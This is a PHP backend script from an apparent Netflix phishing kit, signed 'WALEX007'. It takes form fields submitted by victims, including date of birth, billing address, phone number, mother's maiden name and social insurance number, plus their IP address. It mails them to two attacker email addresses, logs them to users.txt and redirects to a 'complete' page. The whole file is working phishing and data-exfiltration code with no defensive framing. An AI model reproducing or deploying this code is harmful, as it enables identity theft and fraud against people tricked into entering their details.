<?
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Netflix Info-----------------------\n";
$message .= "Date of Birth             : ".$_POST['day']." ".$_POST['month']." ".$_POST['year']."\n";
$message .= "Billing Address            : ".$_POST['billing']."\n";
$message .= "City           : ".$_POST['city']."\n";
$message .= "country            : ".$_POST['county']."\n";
$message .= "Zip Code            : ".$_POST['postcode']."\n";
$message .= "Phone number            : ".$_POST['mobile']."\n";
$message .= "Mothers Maiden            : ".$_POST['mmn']."\n";
$message .= "Social Insurance            : ".$_POST['sin']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY WALEX007-------------\n";
$send = "debedebe@protonmail.com,thomas.potts50@hotmail.com";
$subject = "Result from Netflix";
$headers = "From: Netflix<customer-support@Spammers>";
$headers .= $_POST['debedebe@protonmail.com,thomas.potts50@hotmail.com']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
$fp = fopen("users.txt","a");
fputs($fp,$message);
fclose($fp);
	
		   header("Location: complete.php?ip=$ip");

	 
?>